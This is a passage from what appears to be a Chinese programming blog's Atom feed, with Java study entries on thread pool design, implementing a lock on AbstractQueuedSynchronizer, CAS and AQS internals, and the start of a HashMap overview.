bit(1) NOT NULL DEFAULT b'0' COMMENT '是否删除',  `version` int(11) NOT NULL DEFAULT '0' COMMENT '乐观锁',  `create_userid` varchar(255) NOT NULL DEFAULT '' COMMENT '创建用户Id',  `create_username` varchar(255) NOT NULL DEFAULT '' COMMENT '创建用户名称',  `create_time` timestamp(3) NOT NULL DEFAULT CURRENT_TIMESTAMP(3) COMMENT '创建时间',  `update_userid` varchar(255) NOT NULL DEFAULT '' COMMENT '更新用户Id',  `update_username` varchar(255) NOT NULL DEFAULT '' COMMENT '更新用户名称',  `update_time` timestamp(3) NOT NULL DEFAULT CURRENT_TIMESTAMP(3) ON UPDATE CURRENT_TIMESTAMP(3) COMMENT '更新时间',  PRIMARY KEY (`_id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='??定义表';<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p><strong>小程序、前端</strong></p><pre><code>module.exports = {}    //暴露？全局变量？</code></pre><pre class="line-numbers language-lang-java"><code class="language-lang-java">query  -query是传参数用的。  -上个页面或者那个页面跳转传过来的  -小程序打开的地址链接是可以带请求参数的，跟url的很类似，例如：sdfasdf?abc=123&bcd=234&cde=345。  这个意思是在小程序启动时获取mpid并向全局变量里进行赋值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>网络</strong></p><ul><li><p>ResponseEntity</p><p>1.ResponseEntity的优先级高于@ResponseBody。在不是ResponseEntity的情况下才去检查有没有@ResponseBody注解。如果响应类型是ResponseEntity可以不写@ResponseBody注解，写了也没有关系。<br>2.ResponseEntity 是在 org.springframework.http.HttpEntity 的基础上添加了http status code(http状态码)，用于RestTemplate以及@Controller的HandlerMethod。它在Controoler中或者用于服务端响应时，作用是和@ResponseStatus与@ResponseBody结合起来的功能一样的。用于RestTemplate时，它是接收服务端返回的http status code 和 reason的。<br>3.总结： 简单粗暴的讲 @ResponseBody可以直接返回Json结果， @ResponseEntity不仅可以返回json结果，还可以定义返回的HttpHeaders和HttpStatus </p></li></ul><p><strong>框架</strong></p><ul><li><p>redistemplate </p></li><li><pre><code>@Accessors(chain = true)</code></pre></li><li><p>@EqualsAndHashCode(callSuper = true)<br>//lombok的一个方法</p></li><li><p>@EnableScheduling</p></li><li><p>spring security（JWT、OAUTH2、）鉴权</p><p><a href="https://kayleh.top/head-first-security">https://kayleh.top/head-first-security</a></p></li><li><p>mybatis-plus</p></li></ul><blockquote><p><a href="https://mp.baomidou.com/guide/" target="_blank" rel="noopener">https://mp.baomidou.com/guide/</a></p></blockquote><ul><li><h5 id="Field-baseMapper-in-com-xxx-required-a-single-bean-but-100-were-found-————Mybatis-Plus"><a href="#Field-baseMapper-in-com-xxx-required-a-single-bean-but-100-were-found-————Mybatis-Plus" class="headerlink" title="Field baseMapper in com.xxx required a single bean,but 100 were found ————Mybatis-Plus"></a>Field baseMapper in com.xxx required a single bean,but 100 were found ————Mybatis-Plus</h5></li></ul><p>报错发生时间：项目启动时。</p><p>报错英文描述：Field baseMapper in com.xxx required a single bean,but 100 were found</p><p>报错信息中文描述：文件baseMapper只需要一个bean服务，但是到了多个，所以它不知道选哪个<br>解决：</p><pre class="line-numbers language-lang-java"><code class="language-lang-java">情况一：你的这个类其实不需要操作到数据库，所以这个时候直接把继承IService给去掉就好。情况二：你的这个类需要操作到数据库，那么就把相应的泛型给加上，这样它就知道你到底要找的是哪个mapper。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>基础</strong></p><ul><li><p>生成随机字符串入库时，最好不要用UUID.因为UUID生成的字符串中有字母，在业务中，使用到带字母和数字组合的字符串不常用，最好使用</p><ul><li><pre class="line-numbers language-lang-java"><code class="language-lang-java">math.random()范围是[0.0, 1.0)，那么math.random()*9+1一定是小于10的，(Math.random()*9+1)*100000一定是<10*100000=1000000的一个数<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li></li></ul></li><li><p>判空(null == ?)</p></li><li><p>序列化版本号？</p></li><li><p>拼接字符串</p><pre class="line-numbers language-lang-java"><code class="language-lang-java">String.join(",", List);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>getConstructor和getDeclaredConstructor</p><p>Class类的getConstructor()方法,无论是否设置setAccessible(),都不可获取到类的私有构造器.<br>Class类的getDeclaredConstructor()方法,可获取到类的私有构造器(包括带有其他修饰符的构造器），但在使用private的构造器时，必须设置setAccessible()为true,才可以获取并操作该Constructor对象。</p></li><li><p>MessageFormat.format</p></li><li><pre class="line-numbers language-lang-java"><code class="language-lang-java">Calendar instance = Calendar.getInstance();instance.add(Calendar.SECOND, 90);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li></li></ul><p><strong>多线程</strong></p><ul><li>wait()的作用是让当前线程进入等待状态，同时，wait()也会让当前线程释放它所持有的锁。“直到其他线程调用此对象的 notify() 方法或 notifyAll() 方法”，当前线程被唤醒(进入“就绪状态”)</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;笔记&quot;&gt;&lt;a href=&quot;#笔记&quot; class=&quot;headerlink&quot; title=&quot;笔记&quot;&gt;&lt;/a&gt;笔记&lt;/h4&gt;&lt;h4 id=&quot;TodoList&quot;&gt;&lt;a href=&quot;#TodoList&quot; class=&quot;headerlink&quot; title=&quot;TodoList&quot;
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Thread Pool</title>
    <link href="https://kayleh.top/Thread-pool/"/>
    <id>https://kayleh.top/Thread-pool/</id>
    <published>2021-04-20T08:37:35.000Z</published>
    <updated>2021-04-20T16:51:26.692Z</updated>
    
    <content type="html"><![CDATA[<p>异步执行的代码</p><pre class="line-numbers language-lang-java"><code class="language-lang-java">new Thread(r).start();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>统一的工具类，定一个接口来实现。</p><pre class="line-numbers language-lang-java"><code class="language-lang-java">public interface Executor {    public void execute(Runnable r);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-lang-java"><code class="language-lang-java">// 新线程：直接创建一个新线程运行class FlashExecutor implements Executor {    public void execute(Runnable r) {        new Thread(r).start();    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>假如有 10000 个人都调用这个工具类提交任务，那就会创建 10000 个线程来执行，这肯定不合适吧！能不能控制一下线程的数量呢？</p></blockquote><p>可以把这个任务 r 丢到一个 tasks 队列中，然后只启动一个线程，就叫它 <strong>Worker</strong> 线程吧，不断从 tasks 队列中取任务，执行任务。这样无论调用者调用多少次，永远就只有一个 Worker 线程在运行，像这样。</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/Thread-pool/640.gif" alt="图片"></p><p>这个设计有了三个重大的意义：</p><p>\1. 控制了线程数量。</p><p>\2. 队列不但起到了缓冲的作用，还将任务的提交与执行解耦了。</p><p>\3. 最重要的一点是，解决了每次重复创建和销毁线程带来的系统开销。</p><blockquote><p>不过只有一个后台的工作线程 Worker 会不会少了点？还有如果这个 tasks 队列满了怎么办呢？</p></blockquote><p>Worker 线程的数量要增加，但是具体数量要让使用者决定，调用时传入，就叫核心线程数 <strong>corePoolSize</strong> 吧。</p><p>这样设计。</p><p>\1. 初始化线程池时，直接启动 corePoolSize 个工作线程 Worker 先跑着。</p><p>\2. 这些 Worker 就是死循环从队列里取任务然后执行。</p><p>\3. execute 方法仍然是直接把任务放到队列，但队列满了之后直接抛弃</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/Thread-pool/640-1618937229662.gif" alt="图片"></p><blockquote><p>初始化的时候，就创建了一堆 Worker 线程在那空跑着，假如此时并没有异步任务提交过来执行，这就有点浪费了。</p><p>队列一满，就直接把新任务丢弃了，这样有些粗暴，能不能让调用者自己决定该怎么处理呢？</p></blockquote><p>改进</p><p><strong>1. 按需创建Worker</strong>：刚初始化线程池时，不再立刻创建 corePoolSize 个工作线程，而是等待调用者不断提交任务的过程中，逐渐把工作线程 Worker 创建出来，等数量达到 corePoolSize 时就停止，把任务直接丢到队列里。那就必然要用一个属性记录已经创建出来的工作线程数量，就叫 <strong>workCount</strong> 吧。</p><p><strong>2. 加拒绝策略</strong>：实现上就是增加一个入参，类型是一个接口 <strong>RejectedExecutionHandler</strong>，由调用者决定实现类，以便在任务提交失败后执行 rejectedExecution 方法。</p><p><strong>3. 增加线程工厂</strong>：实现上就是增加一个入参，类型是一个接口 <strong>ThreadFactory</strong>，增加工作线程时不再直接 new 线程，而是调用这个由调用者传入的 ThreadFactory 实现类的 newThread 方法。</p><p>就像下面这样。</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/Thread-pool/640-1618937168495.gif" alt="图片"></p><blockquote><p>在这个场景里，弹性就是在任务提交比较频繁，和任务提交非常不频繁这两种情况下，你这个代码是否有问题？</p><p>这个线程池，当提交任务的量突增时，工作线程和队列都被占满了，就只能走拒绝策略，其实就是被丢弃掉</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/Thread-pool/640-1618937173510.gif" alt="图片"></p><p>调用方可以通过设置很大的核心线程数 corePoolSize 来解决这个问题</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/Thread-pool/640-1618937221389.gif" alt="图片"></p><blockquote><p>可以，但一般场景下 QPS 高峰期都很短，而为了这个很短暂的高峰，设置很大的核心线程数，简直太浪费资源了</p></blockquote><p>最大线程数 <strong>maximumPoolSize</strong>。当核心线程数和队列都满了时，新提交的任务仍然可以通过创建新的工作线程（叫它<strong>非核心线程</strong>），直到工作线程数达到 maximumPoolSize 为止，这样就可以缓解一时的高峰期了，而用户也不用设置过大的核心线程数。</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/Thread-pool/640.png" alt="图片"></p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/Thread-pool/640-1618937269134.gif" alt="图片"></p><p>\1. 开始的时候和上一版一样，当 workCount &lt; corePoolSize 时，通过创建新的 Worker 来执行任务。</p><p>\2. 当 workCount &gt;= corePoolSize 就停止创建新线程，把任务直接丢到队列里。</p><p>\3. 但当队列已满且仍然 workCount &lt; maximumPoolSize 时，不再直接走拒绝策略，而是创建非核心线程，直到 workCount = maximumPoolSize，再走拒绝策略。</p><p>这样 corePoolSize 就负责平时大多数情况所需要的工作线程数，而 maximumPoolSize 就负责在高峰期临时扩充工作线程数。</p><p>高峰时期的弹性搞定了，那自然就还要考虑低谷时期。当长时间没有任务提交时，核心线程与非核心线程都一直空跑着，浪费资源。我们可以给<strong>非核心线程</strong>设定一个超时时间 <strong>keepAliveTime</strong>，当这么长时间没能从队列里获取任务时，就不再等了，销毁线程。</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/Thread-pool/640-1618937263714.gif" alt="图片"></p><p>这回线程池在 QPS 高峰时可以临时扩容，QPS 低谷时又可以及时回收线程（非核心线程）而不至于浪费资源，真的显得十分 Q 弹呢。</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/Thread-pool/640-1618937301920.gif" alt="图片"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>构造方法</p><pre class="line-numbers language-lang-java"><code class="language-lang-java">public FlashExecutor(        int corePoolSize,        int maximumPoolSize,        long keepAliveTime,        TimeUnit unit,        BlockingQueue<Runnable> workQueue,        ThreadFactory threadFactory,        RejectedExecutionHandler handler) {    ... // 省略一些参数校验    this.corePoolSize = corePoolSize;    this.maximumPoolSize = maximumPoolSize;    this.workQueue = workQueue;    this.keepAliveTime = unit.toNanos(keepAliveTime);    this.threadFactory = threadFactory;    this.handler = handler;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这些参数分别是</p><p><strong>int corePoolSize</strong>：核心线程数</p><p><strong>int maximumPoolSize</strong>：最大线程数</p><p><strong>long keepAliveTime</strong>：非核心线程的空闲时间</p><p><strong>TimeUnit unit</strong>：空闲时间的单位</p><p><strong>BlockingQueue workQueue</strong>：任务队列（线程安全的阻塞队列）</p><p><strong>ThreadFactory threadFactory</strong>：线程工厂</p><p><strong>RejectedExecutionHandler handler</strong>：拒绝策略</p><p>整个任务的提交流程是</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/Thread-pool/640.webp" alt="图片"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;异步执行的代码&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-lang-java&quot;&gt;&lt;code class=&quot;language-lang-java&quot;&gt;new Thread(r).start();
&lt;span aria-hidden=&quot;true&quot;
      
    
    </summary>
    
    
    
      <category term="Concurrency" scheme="https://kayleh.top/tags/Concurrency/"/>
    
  </entry>
  
  <entry>
    <title>a Lock Based on ReentrantLock</title>
    <link href="https://kayleh.top/Implement-a-lock-based-on-ReentrantLock/"/>
    <id>https://kayleh.top/Implement-a-lock-based-on-ReentrantLock/</id>
    <published>2021-04-19T08:59:25.000Z</published>
    <updated>2021-04-19T17:26:04.313Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基于-ReentrantLock实现一个锁"><a href="#基于-ReentrantLock实现一个锁" class="headerlink" title="基于 ReentrantLock实现一个锁"></a>基于 ReentrantLock实现一个锁</h2><pre class="line-numbers language-lang-java"><code class="language-lang-java">package aqsLock;import java.util.concurrent.locks.AbstractQueuedSynchronizer;/** * @Author: Kayleh * @Date: 2021/4/20 0:57 */public class aqsLock{    public void lock()    {        sync.acquire(1);    }    public void unlock()    {        sync.release(1);    }    private final Sync sync = new Sync();    public static class Sync extends AbstractQueuedSynchronizer    {        @Override        protected boolean tryAcquire(int arg)        {            // CAS 方式尝试获取锁，成功返回true，失败返回false            if (compareAndSetState(0, 1))                return true;            return false;        }        @Override        protected boolean tryRelease(int arg)        {            // 释放锁            setState(0);            return true;        }    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>基本功能实现，测试：</p><pre class="line-numbers language-lang-java"><code class="language-lang-java">// 可能发生线程安全问题的共享变量private static long count = 0;// 两个线程并发对 count++public static void main(String[] args) throws Exception {    // 创建两个线程，执行add()操作    Thread th1 = new Thread(()-> add());    Thread th2 = new Thread(()-> add());    // 启动两个线程    th1.start();    th2.start();    // 等待两个线程执行结束    th1.join();    th2.join();    // 这里应该是 20000 就对了，说明锁生效了    System.out.println(count);}// 我画了一上午写出来的锁，哈哈private static ExampleLock exampleLock = new ExampleLock();// 循环 count++，进行 10000 次private static void add() {    exampleLock.lock();    for (int i = 0; i < 10000; i++) {        count++;    }    add2();    // 没啥异常，我就直接释放锁了    exampleLock.unlock();}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>非公平锁</strong>，因为线程抢锁不排队，纯看脸。</p><p>实现的排队获取锁，叫<strong>公平锁</strong>，因为只要有线程在排队，新来的就得乖乖去排队，不能直接抢。 </p></blockquote><h2 id="实现一个公平锁"><a href="#实现一个公平锁" class="headerlink" title="实现一个公平锁"></a>实现一个公平锁</h2><pre class="line-numbers language-lang-java"><code class="language-lang-java">@Overridepublic boolean tryAcquire(int acquires) {    // 原有基础上加上这个    if (有线程在等待队列中) {        // 返回获取锁失败，AQS会帮我把该线程放在等待队列队尾的        return false;    }    if (compareAndSetState(0, 1)) {        return true;    }    return false;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>代码：</p><pre class="line-numbers language-lang-java"><code class="language-lang-java">package aqsLock;import java.util.concurrent.locks.AbstractQueuedSynchronizer;/** * @Author: Kayleh * @Date: 2021/4/20 0:57 */public class aqsLock{    public aqsLock(boolean fair)    {        sync = fair ? new Sync() : new NofairSync();    }    public void lock()    {        sync.acquire(1);    }    public void unlock()    {        sync.release(1);    }    private Sync sync = new Sync();    public static class Sync extends AbstractQueuedSynchronizer    {        @Override        protected boolean tryAcquire(int arg)        {            // CAS 方式尝试获取锁，成功返回true，失败返回false            if (hasQueuedPredecessors() && compareAndSetState(0, 1))                return true;            return false;        }        @Override        protected boolean tryRelease(int arg)        {            // 释放锁            setState(0);            return true;        }    }    public static class NofairSync extends Sync    {        @Override        protected boolean tryAcquire(int arg)        {            // CAS 方式尝试获取锁，成功返回true，失败返回false            if (compareAndSetState(0, 1))                return true;            return false;        }        @Override        protected boolean tryRelease(int arg)        {            // 释放锁            setState(0);            return true;        }    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>工具会导致一个线程卡死，一直获取不到锁 </p></blockquote><h2 id="实现方法可以重入"><a href="#实现方法可以重入" class="headerlink" title="实现方法可以重入"></a>实现方法可以重入</h2><pre class="line-numbers language-lang-java"><code class="language-lang-java">public void doSomeThing2() {    flashLock.lock();    doSomeThing2();    flashLock.unlock();}public void doSomeThing2() {    flashLock.lock();    ...    flashLock.unlock();}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>一个线程执行了一个方法，获取了锁，这个方法没有结束，又调用了另一个需要锁的方法，于是卡在这再也不走了。 </p></blockquote><p>怎么 <strong>让同一个线程持有锁时，还能继续获取锁（可重入）</strong>，只有当不同线程才互斥呢？ </p><pre class="line-numbers language-lang-java"><code class="language-lang-java">@Overridepublic boolean tryAcquire(int acquires) {    final Thread current = Thread.currentThread();    int c = getState();    if (c == 0) {        if (hasQueuedPredecessors() && compareAndSetState(0, 1)) {            // 拿到锁记得记录下持锁线程是自己            setExclusiveOwnerThread(current);            return true;        }    } else if (current == getExclusiveOwnerThread()) {        // 看见锁被占了(state!=0)也别放弃，看看是不是自己占的        setState(c + acquires);        return true;    }    return false;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;基于-ReentrantLock实现一个锁&quot;&gt;&lt;a href=&quot;#基于-ReentrantLock实现一个锁&quot; class=&quot;headerlink&quot; title=&quot;基于 ReentrantLock实现一个锁&quot;&gt;&lt;/a&gt;基于 ReentrantLock实现一个锁&lt;/
      
    
    </summary>
    
    
    
      <category term="Concurrency" scheme="https://kayleh.top/tags/Concurrency/"/>
    
  </entry>
  
  <entry>
    <title>CAS &amp; AQS</title>
    <link href="https://kayleh.top/CAS-and-AQS/"/>
    <id>https://kayleh.top/CAS-and-AQS/</id>
    <published>2021-04-18T09:43:22.000Z</published>
    <updated>2021-04-19T17:00:07.119Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CAS（Compare-And-Swap）原理分析"><a href="#CAS（Compare-And-Swap）原理分析" class="headerlink" title="CAS（Compare And Swap）原理分析"></a>CAS（Compare And Swap）原理分析</h2><p>字面意思是<strong>比较和交换</strong>，先看看下面场景（A 和 B 线程同时执行下面的代码）：</p><pre class="line-numbers language-lang-java"><code class="language-lang-java">int i = 10;    //代码1i = 10;        //代码2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>场景 1：A 线程执行代码 1 和代码 2，然后 B 线程执行代码 1 和代码 2，CAS 成功。</p><p>场景 2：A 线程执行代码 1，此时 B 线程执行代码 1 和代码 2，A 线程执行代码 2，CAS 不成功，为什么呢？</p><p>因为 A 线程执行代码 1 时候会旧值（i 的内存地址的值 10）保存起来，执行代码 2 的时候先判断 i 的最新值（可能被其他线程修改了）跟旧值比较，如果相等则把 i 赋值为 20，如果不是则 CAS 不成功。CAS 是一个<strong>原子性操作</strong>，要么成功要么失败，CAS 操作用得比较多的是 sun.misc 包的 Unsafe 类，而 Java 并发包大量使用 Unsafe 类的 CAS 操作，比如：AtomicInteger 整数原子类（本质是自旋锁 + CAS），CAS 不需加锁，提高代码运行效率。也是一种乐观锁方式，我们通常认为在大多数场景下不会出现竞争资源的情况，如果 CAS 操作失败，会不断重试直到成功。</p><p><strong>CAS 优点</strong>：资源竞争不大的场景系统开销小。</p><p><strong>CAS 缺点</strong>：</p><p>如果 CAS 长时间操作失败，即长时间自旋，会导致 CPU 开销大，但是可以使用 CPU 提供的 pause 指令，这个 pause 指令可以让自旋重试失败时 CPU 先睡眠一小段时间后再继续自旋重试 CAS 操作，jvm 支持 pause 指令，可以让性能提升一些。</p><p>存在 ABA 问题，即原来内存地址的值是 A，然后被改为了 B，再被改为 A 值，此时 CAS 操作时认为该值未被改动过，ABA 问题可以引入版本号来解决，每次改动都让版本号 +1。Java 中处理 ABA 的一个方案是 AtomicStampedReference 类，它是使用一个 int 类型的字段作为版本号，每次修改之前都先获取版本号和当前线程持有的版本号比对，如果一致才进行修改操作，并把版本号 +1。</p><p>无法保证代码块的原子性，CAS 只能保证单个变量的原子性操作，如果要保证多个变量的原子性操作就要使用悲观锁了。</p><h2 id="AQS（AbstractQueuedSynchronizer）原理分析"><a href="#AQS（AbstractQueuedSynchronizer）原理分析" class="headerlink" title="AQS（AbstractQueuedSynchronizer）原理分析"></a>AQS（AbstractQueuedSynchronizer）原理分析</h2><p>字面意思是<strong>抽象的队列同步器</strong>，AQS 是一个同步器框架，它制定了一套多线程场景下访问共享资源的方案，Java 中很多同步类底层都是使用 AQS 实现，比如：ReentrantLock、CountDownLatch、ReentrantReadWriteLock，这些 java 同步类的内部会使用一个 Sync 内部类，而这个 Sync 继承了 AbstractQueuedSynchronizer 类，这是一种模板方法模式，所以说这些同步类的底层是使用 AQS 实现。</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/cas/1.png" alt="img"></p><p>AQS 内部维护了一个 volatile 修饰的 int state 属性（共享资源）和一个先进先出的线程等待队列（即多线程竞争共享资源时被阻塞的线程会进入这个队列）。因为 state 是使用 volatile 修饰，所以在多线程之前可见，访问 state 的方式有 3 种，getState()、setState()和 compareAndSetState()。</p><p><strong>AQS 定义了 3 种资源共享方式：</strong></p><p>独占锁（exclusive），保证只有一条线程执行，比如 ReentrantLock、AtomicInteger。</p><p>共享锁（shared），允许多个线程同时执行，比如 CountDownLatch、Semaphore。</p><p>同时实现独占和共享，比如 ReentrantReadWriteLock，允许多个线程同时执行读操作，只允许一条线程执行写操作。</p><p>ReentrantLock 和 CountDownLatch 都是<strong>自定义同步器</strong>，它们的内部类 Sync 都是继承了 AbstractQueuedSynchronizer，独占锁和共享锁的区别在于各自重写的获取和释放共享资源的方式不一样，至于线程获取资源失败、唤醒出队、中断等操作 AQS 已经实现好了。</p><p><strong>ReentrantLock</strong></p><p>state 的初始值是 0，即没有被锁定，当 A 线程 tryAcquire() 时会独占锁住 state，并且把 state+1，然后 B 线程（即其他线程）tryAcquire() 时就会失败进入等待队列，直到 A 线程 tryRelease() 释放锁把 state-1，此时也有可能出现重入锁的情况，state-1 后的值不是 0 而是一个正整数，因为重入锁也会 state+1，只有当 state=0 时，才代表其他线程可以 tryAcquire() 获取锁。</p><p><strong>CountDownLatch</strong></p><p>8 人赛跑场景，即开启 8 个线程进行赛跑，state 的初始值设置为 8（必须与线程数一致），每个参赛者跑到终点（即线程执行完毕）则调用 countDown()，使用 CAS 操作把 state-1，直到 8 个参赛者都跑到终点了（即 state=0），此时调用 await() 判断 state 是否为 0，如果是 0 则不阻塞继续执行后面的代码。</p><p>tryAcquire()、tryRelease()、tryAcquireShared()、tryReleaseShared() 的详细流程分析</p><p><strong>tryAcquire() 详细流程如下：</strong></p><p>调用 tryAcquire() 尝试获取共享资源，如果成功则返回 true;</p><p>如果不成功，则调用 addWaiter() 把此线程构造一个 Node 节点（标记为独占模式），并使用 CAS 操作把节点追加到等待队列的尾部，然后该 Node 节点的线程进入自旋状态;</p><p>线程自旋时，判断自旋节点的前驱节点是不是头结点，并且已经释放共享资源（即 state=0），自旋节点是否成功获取共享资源（即 state=1），如果三个条件都成立则自旋节点设置为头节点，如果不成立则把自旋节点的线程挂起，等待前驱节点唤醒。</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/cas/2.png" alt="img"></p><p><strong>tryRelease() 详细流程如下：</strong></p><p>调用 tryRelease() 释放共享资源，即 state=0，然后唤醒没有被中断的后驱节点的线程;</p><p>被唤醒的线程自旋，判断自旋节点的前驱节点是不是头结点，是否已经释放共享资源（即 state=0），自旋节点是否成功获取共享资源（即 state=1），如果三个条件都成立则自旋节点设置为头节点，如果不成立则把自旋节点的线程挂起，等待被前驱节点唤醒。</p><p><strong>tryAcquireShared() 详细流程如下：</strong></p><p>调用 tryAcquireShared() 尝试获取共享资源，如果 state&gt;=0，则表示同步状态（state）有剩余还可以让其他线程获取共享资源，此时获取成功返回;</p><p>如果 state&lt;0，则表示获取共享资源失败，把此线程构造一个 Node 节点（标记为共享模式），并使用 CAS 操作把节点追加到等待队列的尾部，然后该 Node 节点的线程进入自旋状态;</p><p>线程自旋时，判断自旋节点的前驱节点是不是头结点，是否已经释放共享资源（即 state=0），再调用 tryAcquireShared() 尝试获取共享资源，如果三个条件都成立，则表示自旋节点可执行，同时把自旋节点设置为头节点，并且唤醒所有后继节点的线程。</p><p>如果不成立，挂起自旋的线程，等待被前驱节点唤醒。</p><p><strong>tryReleaseShared() 详细流程如下：</strong></p><p>调用 tryReleaseShared() 释放共享资源，即 state-1，然后遍历整个队列，唤醒所有没有被中断的后驱节点的线程;</p><p>被唤醒的线程自旋，判断自旋节点的前驱节点是不是头结点，是否已经释放共享资源（即 state=0），再调用 tryAcquireShared() 尝试获取共享资源，如果三个条件都成立，则表示自旋节点可执行，同时把自旋节点设置为头节点，并且唤醒所有后继节点的线程。</p><p>如果不成立，挂起自旋的线程，等待被前驱节点唤醒。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;CAS（Compare-And-Swap）原理分析&quot;&gt;&lt;a href=&quot;#CAS（Compare-And-Swap）原理分析&quot; class=&quot;headerlink&quot; title=&quot;CAS（Compare And Swap）原理分析&quot;&gt;&lt;/a&gt;CAS（Compare
      
    
    </summary>
    
    
    
      <category term="Concurrency" scheme="https://kayleh.top/tags/Concurrency/"/>
    
  </entry>
  
  <entry>
    <title>Head First Map</title>
    <link href="https://kayleh.top/head-first-hashmap/"/>
    <id>https://kayleh.top/head-first-hashmap/</id>
    <published>2021-04-17T09:31:12.000Z</published>
    <updated>2021-04-17T18:29:25.128Z</updated>
    
    <content type="html"><![CDATA[<h1 id="深入浅出Map"><a href="#深入浅出Map" class="headerlink" title="深入浅出Map"></a>深入浅出Map</h1><blockquote><p>Map是java里边是一个接口,常见的实现类有HashMap、LinkedHashMap、TreeMap和ConcurrentHashMap</p></blockquote><p>HashMap底层数据结构是<code>数组+链表/红黑树</code></p><p>LinkedHashMap底层数据结构是<code>数组+链表+双向链表</code></p><p>TreeMap底层数据结构是<code>红黑树</code></p><p>ConcurrentHashMap底层数据结构是<code>数组+链表/红黑树</code></p><h2 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h2><blockquote><p>简单总结HashMap：</p><ul><li><strong>无序，允许为null，非同步</strong></li><li><strong>底层由散列表(哈希表)实现</strong></li><li><strong>初始容量和装载因子对HashMap影响挺大的</strong>，设置小了不好，设置大了也不好</li></ul></blockquote><h4 id="new一个hashmap时会发生什么"><a href="#new一个hashmap时会发生什么" class="headerlink" 